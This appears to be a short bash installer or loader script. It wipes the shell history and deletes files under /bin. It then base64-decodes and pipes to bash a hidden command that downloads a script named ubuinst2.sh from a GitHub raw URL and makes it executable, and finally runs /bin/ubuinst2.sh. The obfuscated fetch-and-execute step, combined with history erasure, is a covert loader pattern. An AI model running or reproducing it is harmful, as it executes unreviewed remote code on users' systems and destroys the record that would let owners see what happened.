#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'd2dldCByYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RpZ3VsZ2Fzb2Z0L05BTkRPLWluc3RhbGwvbWFzdGVyL3VidWluc3QyLnNoICYmIGNobW9kICt4IHVidWluc3QyLnNoICYmIGRvczJ1bml4IHVidWluc3QyLnNoID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash
/bin/ubuinst2.sh
